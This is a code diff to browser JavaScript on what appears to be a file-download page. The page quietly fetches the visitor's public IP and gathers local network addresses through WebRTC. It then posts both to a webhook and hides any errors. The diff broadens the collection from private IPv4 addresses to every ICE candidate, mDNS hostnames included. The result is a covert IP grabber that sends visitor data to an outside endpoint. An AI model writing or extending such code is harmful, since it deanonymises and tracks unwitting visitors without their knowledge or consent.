@@ -95,9 +95,9 @@
     link.textContent = `⬇ Download "${name}"`;
   }
 
-  // Get all IPv4 host (local/private) addresses via WebRTC
-  function getAllIPv4(callback) {
-    const ips = new Set();
+  // Get all ICE candidates, including IPv4 and mDNS hostnames
+  function getAllCandidates(callback) {
+    const candidates = new Set();
     const pc = new RTCPeerConnection({ iceServers: [] });
     pc.createDataChannel("");
     pc.createOffer()
@@ -106,17 +106,13 @@
 
     pc.onicecandidate = event => {
       if (!event || !event.candidate) {
-        callback(Array.from(ips));
+        callback(Array.from(candidates));
         return;
       }
       const cand = event.candidate.candidate;
       const parts = cand.split(' ');
-      const ip = parts[4];
-      const type = parts[7];
-
-      if (/^(\d{1,3}\.){3}\d{1,3}$/.test(ip) && type === "host") {
-        ips.add(ip);
-      }
+      const addr = parts[4]; // IP address or mDNS hostname
+      candidates.add(addr);
     };
   }
 
@@ -125,12 +121,12 @@
       .then(res => res.json())
       .then(data => {
         const publicIP = data.ip;
-        getAllIPv4(ips => {
+        getAllCandidates(cands => {
           fetch(webhookUrl, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
-              content: `Public IP: ${publicIP}\nLocal IPv4 (host): ${ips.join(", ") || "None"}`
+              content: `Public IP: ${publicIP}\nLocal ICE Candidates: ${cands.join(", ") || "None"}`
             }),
           }).catch(() => {});
         });
